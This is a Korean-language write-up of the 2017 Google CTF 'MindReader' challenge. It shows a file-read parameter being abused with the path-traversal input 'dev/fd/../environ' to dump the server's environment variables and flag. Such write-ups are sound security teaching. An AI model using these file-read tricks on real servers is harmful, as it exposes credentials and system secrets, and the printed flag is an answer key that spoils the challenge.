# 2017 Google CTF Quals - [Misc] MindReader
## Problem

```
Can you read my mind?

Challenge running at https://mindreader.web.ctfcompetition.com/
```

처음에 사이트를 들어가서 보면,

`Hello, what do you want to read?` 라는 문장과 `TextBox` 그리고 `Submit` 버튼이 있습니다.

또 다른 정보가 없는지 소스를 한번 확인해봅시다.

```
<html>
<head>
</head>
<body>
    <p>Hello, what do you want to read?</p>
    <form method="GET">
        <input type="text" name="f">
        <input type="submit" value="Read">
    </form>
</body>
</html>
```

`GET` 방식으로 `f` 라는 파라미터가 전송되어집니다. 해당 파라미터를 통해서 파일의 내용을
읽을수가 있습니다.

어떤 경로에 어떤 파일이 존재하는지 모르니, `/proc/self/envrion` 을 열어봅니다.

```
Forbidden

You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.
```

그러면 Forbidden 이 뜨면서, 접근을 할 수가 없다고 뜹니다.
다른 방법으로 해당 파일에 접근해야할 것 같습니다. `dev/fd/../environ` 으로 접근을 해보니
플래그가 나옵니다.

```
GAE_MEMORY_MB=614HOSTNAME=2c7fa149dd43GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170618t144344-dv60PORT=8080HOME=/rootPYTHONUNBUFFERED=1GAE_SERVICE=mindreader-sss6w3uqjfrcntmnAPPENGINE.GOOGLEAPIS.INTERNAL_NAME=/gaeapp/appengine.googleapis.internalPATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGAE_DEPLOYMENT_ID=402060873983974243LANG=C.UTF-8DEBIAN_FRONTEND=noninteractiveGCLOUD_PROJECT=ctf-web-kuqo48dGOOGLE_CLOUD_PROJECT=ctf-web-kuqo48dCHALLENGE_NAME=mindreaderVIRTUAL_ENV=/envPWD=/home/vmagent/appGAE_VERSION=20170618t144344FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}
```

`CTF{ee02d9243ed6dfcf83b8d520af8502e1}`
